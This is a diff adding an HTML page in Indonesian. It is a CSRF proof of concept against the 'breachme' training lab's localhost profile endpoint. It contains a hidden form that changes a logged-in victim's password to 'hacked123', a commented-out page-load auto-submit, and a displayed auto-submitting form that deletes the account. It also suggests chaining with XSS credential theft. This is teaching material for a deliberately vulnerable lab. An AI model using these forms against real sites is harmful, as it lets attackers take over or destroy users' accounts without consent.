@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>CSRF Demo — breachme Lab</title>
+<style>
+body{font-family:monospace;background:#1a1a1a;color:#00ff88;padding:2rem;}
+h2{color:#ff3b3b;}
+code{background:#0a0a0a;padding:2px 6px;border-radius:3px;}
+.panel{background:#0f0f0f;border:1px solid #333;padding:1.5rem;border-radius:6px;margin:1rem 0;}
+button{background:#ff3b3b;color:#fff;border:none;padding:8px 20px;border-radius:4px;cursor:pointer;font-family:monospace;font-weight:bold;}
+</style>
+</head>
+<body>
+<h2>⚡ CSRF PoC — Ganti Password Tanpa Token</h2>
+<div class="panel">
+  <p>Halaman ini mensimulasikan serangan CSRF terhadap <code>/public/profile.php</code>.</p>
+  <p>Jika korban membuka halaman ini saat sedang login di breachme, password-nya akan diganti.</p>
+  <p><strong>Target:</strong> <code>http://localhost:8080/public/profile.php</code></p>
+  <p><strong>Vuln:</strong> Form tidak menggunakan CSRF token — request dari domain lain diterima.</p>
+</div>
+
+<!-- [VULN: CSRF] — form otomatis submit ke endpoint profile.php tanpa token -->
+<form id="csrfForm" method="POST" action="http://localhost:8080/public/profile.php" style="display:none;">
+  <input type="hidden" name="action" value="change_password">
+  <input type="hidden" name="old_password" value="<!-- korban harus tahu password lama, atau combine dengan cred leak -->">
+  <input type="hidden" name="new_password" value="hacked123">
+  <input type="hidden" name="confirm_password" value="hacked123">
+</form>
+
+<div class="panel">
+  <p>Klik tombol di bawah untuk trigger CSRF request manual (simulasi):</p>
+  <button onclick="document.getElementById('csrfForm').submit()">🔥 Trigger CSRF Attack</button>
+  <br><br>
+  <p style="color:#ffb800;">Catatan: CSRF change_password butuh old_password — combine dengan vuln lain (e.g. XSS steal credentials) untuk full chain.</p>
+</div>
+
+<div class="panel">
+  <p><strong>Auto-submit CSRF (tanpa interaksi korban):</strong></p>
+  <p>Untuk delete account (tidak butuh old password verifikasi yang kita tahu):</p>
+  <pre style="color:#00d4ff;">
+&lt;form id="f" method="POST" action="http://localhost:8080/public/profile.php"&gt;
+  &lt;input type="hidden" name="action" value="delete_account"&gt;
+  &lt;input type="hidden" name="delete_confirm_password" value="targetpassword"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+  </pre>
+</div>
+
+<script>
+// Auto-submit (uncomment untuk demo agresif)
+// window.onload = () => document.getElementById('csrfForm').submit();
+console.log('[CSRF Demo] Halaman dimuat. Form siap — klik tombol atau uncomment auto-submit.');
+</script>
+</body>
+</html>
